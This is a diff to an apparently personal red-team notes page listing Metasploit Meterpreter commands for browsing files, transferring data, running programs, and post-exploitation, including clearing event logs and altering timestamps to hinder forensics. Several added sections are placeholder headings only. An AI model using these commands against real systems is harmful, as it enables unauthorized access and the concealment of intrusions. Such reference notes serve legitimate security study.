@@ -100,37 +100,41 @@ Call `help` to see what you can use given the current payload.
 meterpreter > help # list commands that you can use
 ```
 
+<br>
+
 #### Meterpreter — Common Commands
 
 You can use many Linux-like commands such as:
 
 ```shell!
-meterpreter> execute # execute a command
-meterpreter> ls # list files
-meterpreter> cd # move
-meterpreter> pwd # path to current folder
-meterpreter> cat file # print file
-meterpreter> edit file # open file in vim
-meterpreter> ps # see running processes
-meterpreter> exit
+meterpreter> ls        # List files
+meterpreter> cd        # Move to some folder
+meterpreter> pwd       # Path to current folder
+meterpreter> cat file  # Show the contents of a file
+meterpreter> edit file # Open a file in VIM
+meterpreter> ps        # List running processes
+meterpreter> ipconfig  # Show network information
+meterpreter> execute -f xxx.exe -a "args here" # Run a program
+meterpreter> exit      # Kill the meterpreter
 ```
 
 These are new convenient functions that were added:
 
 ```shell!
-meterpreter> search -f pattern # search file by pattern
-meterpreter> search -f pattern / # search inside /
-meterpreter> download remote_path local_path # download
-meterpreter> upload local_path remote_path # upload
+meterpreter> search -f pattern   # Search files by pattern
+meterpreter> search -f pattern / # Search [...] inside /
+meterpreter> download remote_path local_path # Download
+meterpreter> upload local_path remote_path   # Upload
+meterpreter> resolve hostname    # Get the IP from hostname
 ```
 
 You can run commands on your machine in the meterpreter:
 
 ```shell!
-meterpreter> lpwd # or getlwd, local path
-meterpreter> lcd path # move to local path
-meterpreter> lls path # list local files
-meterpreter> lcat file # print local file
+meterpreter> lpwd      # Show the current local folder
+meterpreter> lcd path  # Move to another local folder
+meterpreter> lls path  # List local files
+meterpreter> lcat file # Show the contents of a local file
 ```
 </div><div>
 
@@ -141,6 +145,55 @@ meterpreter> lcat file # print local file
 * [Exploitation commands](_files/msf_exploitation.md)
 * [Post-exploitation commands](_files/msf_post.md)
 
+</div></div>
+
+<hr class="sep-both">
+
+## Metasploit Post-Exploitation
+
+<div class="row row-cols-lg-2"><div>
+
+#### Meterpreter — Complicate Forensics
+
+You may be able to use these:
+
+```shell!
+meterpreter> clearev   # clear logs
+meterpreter> timestomp # mess with timestamps
+```
+
+<br>
+
+#### Meterpreter — Pivoting
+
+Refer to [this](/cybersecurity/red-team/s5.post-exploitation/index.md#pivoting-to-another-host-) for tunneling/port forwarding.
+
+```shell!
+meterpreter> run post/windows/gather/checkvm
+```
+
+<br>
+
+#### Meterpreter — Basic Post-Exploitation Commands
+
+...
+</div><div>
+
+#### Meterpreter — Basic Post-Exploitation Commands
+
+...
+
+<br>
+
+#### Meterpreter — Basic Post-Exploitation Commands
+
+...
+
+<br>
+
+#### Meterpreter — Basic Post-Exploitation Commands
+
+...
 </div></div>
 
 <hr class="sep-both">
